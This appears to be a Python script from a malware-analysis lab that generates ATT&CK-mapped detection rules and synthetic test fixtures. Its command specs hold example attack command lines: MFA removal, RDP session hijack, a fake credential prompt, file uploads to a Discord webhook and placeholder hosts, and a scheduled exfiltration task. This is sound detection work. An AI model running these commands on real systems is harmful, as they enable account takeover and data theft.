    "powershell",
    r'-NoProfile[ \t]+-Command[ \t]+"Set-MsolUser[ \t]+-UserPrincipalName[ \t]+[\w.@-]+[ \t]+-StrongAuthenticationRequirements[ \t]+@\(\)"',
    'powershell.exe -NoProfile -Command "Set-MsolUser -UserPrincipalName labuser@lab.local -StrongAuthenticationRequirements @()"',
    'powershell.exe -NoProfile -Command "Get-MsolUser -UserPrincipalName labuser@lab.local"',
    "Requests removal of a user's MFA requirements using the legacy administration module.",
)
command(
    "T1563",
    "tscon",
    r"[1-9][0-9]*[ \t]+/dest:console",
    "tscon.exe 2 /dest:console",
    "tscon.exe /?",
    "Requests reassignment of an existing remote desktop session to the console.",
)
command(
    "T1563.002",
    "tscon",
    r"[1-9][0-9]*[ \t]+/dest:console",
    "tscon.exe 2 /dest:console",
    "tscon.exe /?",
    "Requests RDP session reassignment; session ownership and unauthorized hijacking need qualification.",
)
command(
    "T1564.008",
    "powershell",
    r'-NoProfile[ \t]+-Command[ \t]+"New-InboxRule[ \t]+-Name[ \t]+[\w.-]+[ \t]+-SubjectContainsWords[ \t]+(?:phish|malware|security)[ \t]+-DeleteMessage[ \t]+\$true"',
    'powershell.exe -NoProfile -Command "New-InboxRule -Name LabRule -SubjectContainsWords security -DeleteMessage $true"',
    'powershell.exe -NoProfile -Command "Get-InboxRule"',
    "Requests an inbox rule deleting security-related messages; mailbox state remains unproven.",
)
command(
    "T1046",
    "nmap",
    r"-sT[ \t]+-p[ \t]+[0-9]+-[0-9]+[ \t]+[\w.-]+",
    "nmap.exe -sT -p 1-1024 labhost",
    "nmap.exe --version",
    "Requests a TCP service-port scan of an explicit target; discovered services and network impact remain unproven.",
)
command(
    "T1127.002",
    "rundll32",
    r'dfshim\.dll,ShOpenVerbApplication1[ \t]+https?://[^\s"]+\.application',
    "rundll32.exe dfshim.dll,ShOpenVerbApplication1 https://example.invalid/app.application",
    "rundll32.exe shell32.dll,Control_RunDLL",
    "Requests ClickOnce application activation through the documented dfshim entry point.",
)
command(
    "T1056",
    "powershell",
    r'-NoProfile[ \t]+-Command[ \t]+"\$cred[ \t]*=[ \t]*Get-Credential[ \t]+-Message[ \t]+\x27Windows Security\x27"',
    "powershell.exe -NoProfile -Command \"$cred = Get-Credential -Message 'Windows Security'\"",
    'powershell.exe -NoProfile -Command "Get-Process"',
    "Requests a credential-input prompt and retains the supplied credential object; prompt deception and later use are unproven.",
)
command(
    "T1056.002",
    "powershell",
    r'-NoProfile[ \t]+-Command[ \t]+"\$cred[ \t]*=[ \t]*Get-Credential[ \t]+-Message[ \t]+\x27Windows Security\x27"',
    "powershell.exe -NoProfile -Command \"$cred = Get-Credential -Message 'Windows Security'\"",
    'powershell.exe -NoProfile -Command "Get-Process"',
    "Requests a GUI credential prompt labeled Windows Security; impersonation of a legitimate request requires context.",
)
command(
    "T1219",
    "anydesk",
    r"[1-9][0-9]{8}",
    "anydesk.exe 123456789",
    "anydesk.exe --version",
    "Requests a connection through remote desktop access software; remote control success and C2 purpose are unproven.",
)
command(
    "T1219.002",
    "anydesk",
    r"[1-9][0-9]{8}",
    "anydesk.exe 123456789",
    "anydesk.exe --version",
    "Requests an AnyDesk peer session using a concrete peer ID.",
)
command(
    "T1219.001",
    "code",
    r"tunnel[ \t]+--accept-server-license-terms[ \t]+--name[ \t]+[\w.-]+",
    "code.exe tunnel --accept-server-license-terms --name labhost",
    "code.exe --version",
    "Requests a named IDE remote tunnel; server registration, access, and authorization need qualification.",
)
command(
    "T1090.003",
    "ssh",
    r"-J[ \t]+[\w.@-]+,[\w.@-]+[ \t]+[\w.@-]+[ \t]+-N",
    "ssh.exe -J user@jump1,user@jump2 user@target -N",
    "ssh.exe user@target hostname",
    "Requests a two-jump SSH proxy chain; actual route and C2 use remain unproven.",
)
command(
    "T1678",
    "timeout",
    r"/T[ \t]+[1-9][0-9]{2,}[ \t]+/NOBREAK",
    "timeout.exe /T 600 /NOBREAK",
    "timeout.exe /?",
    "Requests a long uninterruptible command delay; evasion intent and wall-clock effect remain unproven.",
)
for technique in ("T1567", "T1567.004"):
    command(
        technique,
        "curl",
        r'-F[ \t]+file=@[A-Z]:\\[^\s"]+[ \t]+https://(?:discord\.com|discordapp\.com)/api/webhooks/[0-9]+/[A-Za-z0-9_-]+',
        "curl.exe -F file=@C:\\data\\report.txt https://discord.com/api/webhooks/123456789/example-token",
        "curl.exe https://discord.com/",
        "Requests uploading a local file through a concrete web-service webhook API; data sensitivity, unauthorized disclosure, and actual upload need qualification.",
    )
for technique in ("T1074", "T1074.001", "T1119"):
    command(
        technique,
        "robocopy",
        r"C:\\Users\\[^\\\s]+\\Documents[ \t]+C:\\ProgramData\\[^\s&|<>]+[ \t]+/S",
        "robocopy.exe C:\\Users\\lab\\Documents C:\\ProgramData\\stage /S",
        "robocopy.exe /?",
        "Requests recursive collection of user documents into a local staging directory. The data's later use, authorization, and actual copy results remain unproven.",
    )
command(
    "T1074.002",
    "robocopy",
    r"C:\\Users\\[^\\\s]+\\Documents[ \t]+\\\\[^\\\s]+\\[^\s&|<>]+[ \t]+/S",
    "robocopy.exe C:\\Users\\lab\\Documents \\\\fileserver\\stage /S",
    "robocopy.exe C:\\Users\\lab\\Documents C:\\ProgramData\\stage /S",
    "Requests recursive collection of user documents into a network-share staging location; endpoint ownership and results remain unproven.",
)
command(
    "T1020",
    "powershell",
    r'-NoProfile[ \t]+-Command[ \t]+"Get-ChildItem[ \t]+C:\\Users\\[^\\\s]+\\Documents[ \t]+-File[ \t]+\|[ \t]+ForEach-Object[ \t]+\{[ \t]+Invoke-WebRequest[ \t]+-Uri[ \t]+https://[^\s"]+/upload[ \t]+-Method[ \t]+Post[ \t]+-InFile[ \t]+\$_\.FullName[ \t]+\}"',
    'powershell.exe -NoProfile -Command "Get-ChildItem C:\\Users\\lab\\Documents -File | ForEach-Object { Invoke-WebRequest -Uri https://example.invalid/upload -Method Post -InFile $_.FullName }"',
    'powershell.exe -NoProfile -Command "Get-ChildItem C:\\Users\\lab\\Documents -File"',
    "Requests a loop uploading each selected document as HTTP request content. It does not infer automation from an isolated send or claim upload success.",
)
command(
    "T1029",
    "schtasks",
    r'/Create[ \t]+/TN[ \t]+[\w.-]+[ \t]+/SC[ \t]+DAILY[ \t]+/ST[ \t]+(?:[01][0-9]|2[0-3]):[0-5][0-9][ \t]+/TR[ \t]+"curl\.exe[ \t]+-F[ \t]+file=@C:\\[^\s"]+[ \t]+https://[^\s"]+/upload"',
    'schtasks.exe /Create /TN LabUpload /SC DAILY /ST 02:00 /TR "curl.exe -F file=@C:\\data\\report.txt https://example.invalid/upload"',
    'schtasks.exe /Create /TN LabTask /SC DAILY /ST 02:00 /TR "notepad.exe"',
    "Requests a daily scheduled local-file upload. Task registration, later triggering, remote acceptance, and exfiltration intent require qualification.",
)
command(
    "T1090.004",
    "curl",
    r'-H[ \t]+"Host:[ \t]+(?P<hidden>[a-z0-9.-]+)"[ \t]+https://(?!(?P=hidden)(?:/|[ \t]|\Z))[a-z0-9.-]+/[^\s"]*',
    'curl.exe -H "Host: hidden.example.invalid" https://front.example.invalid/',
    'curl.exe -H "Host: front.example.invalid" https://front.example.invalid/',
    "Requests HTTPS with a Host header different from the URL's TLS hostname. Actual SNI, front-end routing, domain ownership, and C2 role remain unproven.",
)
command(
    "T1090.002",
    "cloudflared",
    r"tunnel[ \t]+--url[ \t]+http://(?:127\.0\.0\.1|localhost):[0-9]+",
    "cloudflared.exe tunnel --url http://127.0.0.1:8080",
    "cloudflared.exe --version",
    "Requests a public Quick Tunnel proxy to a local service. The actual external endpoint, routing, program identity, and C2 purpose remain unproven.",
)
command(
    "T1499.001",
    "testlimit64",
    r"-d[ \t]+[1-9][0-9]{3,}",
    "testlimit64.exe -d 1024",
    "testlimit64.exe -d 1024 -c 1",
    "Requests unbounded committed/touched memory allocations using the documented default allocation count. Low-resource impact, utility identity, and malicious intent remain unproven.",
)

# Hydra options are case sensitive. Inline flag scopes preserve that semantic
# even though Windows executable path matching is case insensitive.
for spec in COMMANDS:
    if spec["attack_id"] in {"T1110", "T1110.001", "T1110.003", "T1110.004"}:
        for flag in ("-l", "-L", "-p", "-P", "-C"):
            spec["pattern"] = spec["pattern"].replace(flag + "[", "(?-i:" + flag + ")[")


def digest(path):
    return hashlib.sha256(path.read_bytes()).hexdigest()


def main():
    review_path = ROOT / "coverage/windows-attack-gap-review-v1.json"
    review = {
        r["attack_id"]: r for r in json.loads(review_path.read_text())["techniques"]
    }
    attack_metadata = {
        row["attack_id"]: row["capa_attack_tags"]
        for row in json.loads(
            (ROOT / "coverage/windows-feasible-attack-metadata-v1.json").read_text()
        )["techniques"]
    }
    baseline = json.loads(
        (ROOT / "coverage/windows-trace-prerequisite-models-v1.json").read_text()
    )
    pending = {
        r["attack_id"] for r in baseline["models"] if not r["counts_toward_capacity"]
    }
    assert len(pending) == 293
    fixtures = []
    directory = ROOT / "feasible-variants"
    directory.mkdir(exist_ok=True)
    for spec in COMMANDS:
        attack_id = spec["attack_id"]
        assert attack_id in pending
        source = review[attack_id]
        name = "request " + source["name"].lower() + " via explicit utility command"
        filename = attack_id.lower().replace(".", "-") + "-utility.yml"
        pattern = spec["pattern"][4:]
        document = {
            "rule": {
                "meta": {
                    "name": name,
                    "namespace": "in-house/feasible-variants",
                    "authors": ["MalwareLab"],
                    "description": spec["note"]
                    + " Static function-local references are capability candidates only. Dynamic observations require the separate typed launch contract; neither proves utility completion or malicious intent.",
                    "scopes": {"static": "function", "dynamic": "unsupported"},
                    "att&ck": attack_metadata[attack_id],
                    "references": [source["official_url"]],
                },
                "features": [
                    {
                        "and": [
                            {
                                "or": [
                                    {"api": api}
                                    for api in [
                                        "CreateProcess",
                                        "CreateProcessInternal",
                                        "CreateProcessAsUser",
                                        "CreateProcessWithToken",
                                        "CreateProcessWithLogon",
                                    ]
                                ]
                            },
                            {"string": "/" + pattern + "/i"},
                        ]
                    }
                ],
            }
        }
        (directory / filename).write_text(
            yaml.safe_dump(document, sort_keys=False, width=110)
        )
        fixtures.append(
            {
                **spec,
                "rule_name": name,
                "rule_path": "feasible-variants/" + filename,
                "official_url": source["official_url"],
                "definition_sha256": source["definition_sha256"],
            }
        )
    output = ROOT / "fixtures/feasible-command-cases.json"
    output.write_text(
        json.dumps(
            {
                "schema": 1,
                "scope": "Synthetic capability fixtures only; never sample evidence.",
                "cases": fixtures,
            },
            indent=2,
        )
        + "\n"
    )
    catalog_path = ROOT / "trace-contracts/windows-prerequisites-v1.json"
    catalog = json.loads(catalog_path.read_text())
    # Preserve the previous hand-reviewed contracts; regeneration is idempotent.
    catalog["rules"] = [
        r for r in catalog["rules"] if not r["id"].startswith("feasible-launch-")
    ]
    for spec in fixtures:
        catalog["rules"].append(
            {
                "id": "feasible-launch-" + spec["attack_id"].lower().replace(".", "-"),
                "attack_id": spec["attack_id"],
                "name": spec["rule_name"],
                "source": spec["official_url"],
                "description": spec["note"],
                "same_thread": False,
                "max_call_gap": 0,
                "max_elapsed_ns": 60_000_000_000,
                "stages": [
                    {
                        "id": "launch-explicit-command",
                        "apis": LAUNCH_APIS,
                        "where": [
                            {
                                "field": "command_line",
                                "op": "regex",
                                "value": spec["pattern"],
                            },
                            {
                                "field": "application_name",
                                "op": "regex",
                                "value": spec["application_pattern"],
                            },
                        ],
                        "bind": {},
                    }
                ],
                "invalidate": [],
                "qualification_required": [
                    "sample/caller identity",
                    "actual executable identity and trust",
                    "utility operation outcome, target and effect",
                    "adversary intent remains unproven",
                ],
            }
        )
    observable_cases = []
    for spec in FILES + REGISTRY:
        attack_id = spec["attack_id"]
        assert attack_id in pending
        source = review[attack_id]
        action = spec["action"]
        family = "file" if spec in FILES else "registry"
        identifier = (
            "feasible-"
            + family
            + "-"
            + action
            + "-"
            + attack_id.lower().replace(".", "-")
        )
        where = lambda field, op, value: {"field": field, "op": op, "value": value}
        if family == "file":
            assert re.search(spec["pattern"], spec["positive"])
            assert not re.search(spec["pattern"], spec["negative"])
            stages = [
                {
                    "id": "open-target",
                    "apis": ["createfile"],
                    "where": [
                        where("path", "regex", spec["pattern"]),
                        where("handle", "handle", True),
                    ],
                    "bind": {"target": "handle"},
                },
                {
                    "id": action + "-target",
                    "apis": [action + "file"],
                    "where": [
                        where("handle", "eq", {"ref": "target"}),
                        where("bytes_transferred", "gt", 0),
                    ],
                    "bind": {},
                },
            ]
            invalidate = [
                {
                    "apis": ["closehandle", "createfile"],
                    "field": "handle",
                    "binding": "target",
                }
            ]
            positive = [
                {
                    "api": "CreateFileW",
                    "arguments": {"path": spec["positive"], "handle": 64},
                },
                {
                    "api": action.title() + "File",
                    "arguments": {"handle": 64, "bytes_transferred": 8},
                },
            ]
            negative = [
                {
                    "api": "CreateFileW",
                    "arguments": {"path": spec["negative"], "handle": 64},
                },
                positive[1],
            ]
            static_features = [
                {"api": "CreateFile"},
                {"api": action.title() + "File"},
                {"string": "/" + spec["pattern"][4:] + "/i"},
            ]
            if "payload_pattern" in spec:
                stages[-1]["where"].append(
                    where("written_text", "regex", spec["payload_pattern"])
                )
                raw = spec["positive_text"].encode()
                positive[-1]["arguments"].update(
                    buffer_hex=raw.hex(), bytes_transferred=len(raw)
                )
                static_features.append({"string": "/" + spec["payload_pattern"] + "/i"})
            if "payload_op" in spec:
                stages[-1]["where"].append(
                    where("buffer_hex", spec["payload_op"], True)
                )
                positive[-1]["arguments"].update(
                    buffer_hex="@fixture:" + spec["positive_fixture"],
                    bytes_transferred="@fixture_size",
                )
        else:
            assert re.search(spec["key_pattern"], spec["positive_key"])
            assert re.search(spec["value_pattern"], spec["positive_value"])
            operation = "regsetvalueex" if action == "set" else "regqueryvalueex"
            data = spec["data"]
            value_type = 4 if isinstance(data, int) else 1
            data_test = where(
                "value_data", "eq" if isinstance(data, int) else "regex", data
            )
            stages = [
                {
                    "id": "open-exact-key",
                    "apis": ["regopenkeyex", "regcreatekeyex"],
                    "where": [
                        where("key_path", "regex", spec["key_pattern"]),
                        where("key_handle", "handle", True),
                    ],
                    "bind": {"target": "key_handle"},
                },
                {
                    "id": action + "-exact-value",
                    "apis": [operation],
                    "where": [
                        where("key_handle", "eq", {"ref": "target"}),
                        where("value_name", "regex", spec["value_pattern"]),
                        where("value_type", "eq", value_type),
                        data_test,
                    ],
                    "bind": {},
                },
            ]
            invalidate = [
                {
                    "apis": ["regclosekey", "regopenkeyex", "regcreatekeyex"],
                    "field": "key_handle",
                    "binding": "target",
                }
            ]
            positive = [
                {
                    "api": "RegOpenKeyExW",
                    "arguments": {"key_path": spec["positive_key"], "key_handle": 64},
                },
                {
                    "api": "RegSetValueExW" if action == "set" else "RegQueryValueExW",
                    "arguments": {
                        "key_handle": 64,
                        "value_name": spec["positive_value"],
                        "value_type": value_type,
                        "value_data": spec["positive_data"],
                    },
                },
            ]
            negative = [
                positive[0],
                {
                    **positive[1],
                    "arguments": {
                        **positive[1]["arguments"],
                        "value_data": spec["negative_data"],
                    },
                },
            ]
            static_features = [
                {"api": "RegSetValueEx" if action == "set" else "RegQueryValueEx"},
                {"string": "/" + spec["key_pattern"][4:] + "/i"},
                {"string": "/" + spec["value_pattern"][4:] + "/i"},
            ]
            if action == "query":
                pass  # Returned contents are not statically available.
            elif isinstance(data, int):
                static_features.append({"number": data})
            else:
                static_features.append(
                    {
                        "string": "/"
                        + (data[4:] if data.startswith("(?i)") else data)
                        + "/i"
                    }
                )
        contract = {
            "id": identifier,
            "attack_id": attack_id,
            "name": action + " bound " + family + " variant for " + source["name"],
            "source": source["official_url"],
            "description": spec["note"],
            "same_thread": False,
            "max_call_gap": 100,
            "max_elapsed_ns": 60_000_000_000,
            "stages": stages,
            "invalidate": invalidate,
            "qualification_required": [
                "sample/caller provenance",
                "target configuration and resulting effects",
                "malicious intent remains unproven",
            ],
        }
        catalog["rules"] = [r for r in catalog["rules"] if r["id"] != identifier]
        catalog["rules"].append(contract)
        filename = identifier + ".yml"
        rule_name = "reference " + contract["name"]
        document = {
            "rule": {
                "meta": {
                    "name": rule_name,
                    "namespace": "in-house/feasible-variants",
                    "authors": ["MalwareLab"],
                    "description": spec["note"]
                    + " Static references are function-local candidates; the bound dynamic contract is separate.",
                    "scopes": {"static": "function", "dynamic": "unsupported"},
                    "att&ck": attack_metadata[attack_id],
                    "references": [source["official_url"]],
                },
                "features": [{"and": static_features}],
            }
        }
        # Some static extractors intentionally filter Unicode control strings.
        # Such a contract remains dynamic-only instead of claiming static reach.
        dynamic_only = attack_id in {"T1036.002", "T1027.018"} or "payload_op" in spec
        if not dynamic_only:
            (directory / filename).write_text(
                yaml.safe_dump(document, sort_keys=False, width=110)
            )
        observable_cases.append(
            {
                **spec,
                "rule_id": identifier,
                "rule_name": rule_name,
                "rule_path": None if dynamic_only else "feasible-variants/" + filename,
                "family": family,
                "positive_calls": positive,
                "negative_calls": negative,
                "source": source["official_url"],
                "definition_sha256": source["definition_sha256"],
            }
        )
    (ROOT / "fixtures/feasible-observable-cases.json").write_text(
        json.dumps(
            {
                "schema": 1,
                "scope": "Synthetic raw-argument fixtures only; never sample evidence.",
                "cases": observable_cases,
            },
            indent=2,
        )
        + "\n"
    )
    relations = get_cases(catalog) + NETWORK_CASES + MEMORY_CASES
    for case in relations:
        source = review[case["attack_id"]]
        identifier = "feasible-relation-" + case["attack_id"].lower().replace(".", "-")
        contract = {
            "id": identifier,
            "attack_id": case["attack_id"],
            "name": case["name"],
            "source": source["official_url"],
            "description": case["note"],
            "same_thread": case["same_thread"],
            "max_call_gap": 100,
            "max_elapsed_ns": 60_000_000_000,
            "stages": case["stages"],
            "invalidate": case["invalidate"],
            "qualification_required": [
                "sample and caller provenance",
                "target identity and independently checked effects",
                "malicious intent remains unproven",
            ],
        }
        catalog["rules"] = [r for r in catalog["rules"] if r["id"] != identifier]
        catalog["rules"].append(contract)
        case.update(
            rule_id=identifier,
            source=source["official_url"],
            definition_sha256=source["definition_sha256"],
        )
    (ROOT / "fixtures/feasible-relation-cases.json").write_text(
        json.dumps(
            {
                "schema": 1,
                "scope": "Synthetic byte/object/path relation fixtures; never sample evidence.",
                "cases": relations,
            },
            indent=2,
        )
        + "\n"
    )
    static_cases = []
    for attack_id, name, scope, features, note in STATIC_SPECS:
        assert attack_id in pending
        source = review[attack_id]
        filename = "feasible-static-" + attack_id.lower().replace(".", "-") + ".yml"
        document = {
            "rule": {
                "meta": {
                    "name": name,
                    "namespace": "in-house/feasible-variants",
                    "authors": ["MalwareLab"],
                    "description": note
                    + " Static capability candidate only; never qualified runtime evidence.",
                    "scopes": {"static": scope, "dynamic": "unsupported"},
                    "att&ck": attack_metadata[attack_id],
                    "references": [source["official_url"]],
                },
                "features": [{"and": features}],
            }
        }
        (directory / filename).write_text(
            yaml.safe_dump(document, sort_keys=False, width=110)
        )
        static_cases.append(
            dict(
                attack_id=attack_id,
                rule_name=name,
                scope=scope,
                features=features,
                rule_path="feasible-variants/" + filename,
                source=source["official_url"],
                definition_sha256=source["definition_sha256"],
                note=note,
            )
        )
    (ROOT / "fixtures/feasible-static-cases.json").write_text(
        json.dumps(
            {
                "schema": 1,
                "scope": "Static capability regression cases; never runtime evidence.",
                "cases": static_cases,
            },
            indent=2,
        )
        + "\n"
    )
    catalog_path.write_text(json.dumps(catalog, indent=2) + "\n")
    inventory = []
    for attack_id in sorted(pending):
        source = review[attack_id]
        paths = sorted(
            {
                row["rule_path"]
                for row in fixtures + observable_cases + static_cases
                if row["attack_id"] == attack_id and row.get("rule_path")
            }
        )
        contracts = [r["id"] for r in catalog["rules"] if r["attack_id"] == attack_id]
        enabled = bool(paths or contracts)
        row = {
            "attack_id": attack_id,
            "name": source["name"],
            "official_url": source["official_url"],
            "definition_sha256": source["definition_sha256"],
            "website_sha256": source["website_sha256"],
            "definition_requirement": source["definition_requirement"],
            "disposition": "implemented_supported_variant"
            if enabled
            else "additional_evidence_or_backend_required",
            "counts_toward_capacity": enabled,
            "static_rule_paths": paths,
            "trace_contract_ids": contracts,
            "evidence_ceiling": "observation_candidate"
            if contracts
            else "static_candidate"
            if paths
            else None,
        }
        if not enabled:
            assert attack_id in DEFERRED, attack_id
            row.update(DEFERRED[attack_id])
        inventory.append(row)
    unresolved = {r["attack_id"] for r in inventory if not r["counts_toward_capacity"]}
    assert unresolved == set(DEFERRED), sorted(unresolved ^ set(DEFERRED))
    (ROOT / "coverage/windows-feasible-gap-review-v1.json").write_text(
        json.dumps(
            {
                "schema": 1,
                "scope": "Complete frozen 293-ID assessment. Specific supported variants are executable candidates; remaining designs need additional evidence or analysis and are not declared impossible.",
                "assessment_limits": [
                    "No completeness proof for all implementations of any technique.",
                    "Static co-occurrence is weaker than dynamic argument/dataflow binding.",
                    "Unit fixtures are synthetic and never sample evidence.",
                    "Missing collectors, context, or backends are explicit engineering dependencies, not proof of impossibility.",
                ],
                "baseline_missing_ids": 293,
                "baseline_model_inventory_sha256": digest(
                    ROOT / "coverage/windows-trace-prerequisite-models-v1.json"
                ),
                "contract_catalog_sha256": digest(catalog_path),
                "summary": {
                    "implemented_ids": len(inventory) - len(unresolved),
                    "additional_evidence_or_backend_required": len(unresolved),
                    "new_static_rule_files": len(list(directory.glob("*.yml"))),
                },
                "techniques": inventory,
            },
            indent=2,
        )
        + "\n"
    )
    print(
        json.dumps(
            {
                "command_detectors": len(fixtures),
                "observable_detectors": len(observable_cases),
                "relation_detectors": len(relations),
            }
        )
    )


if __name__ == "__main__":
    main()
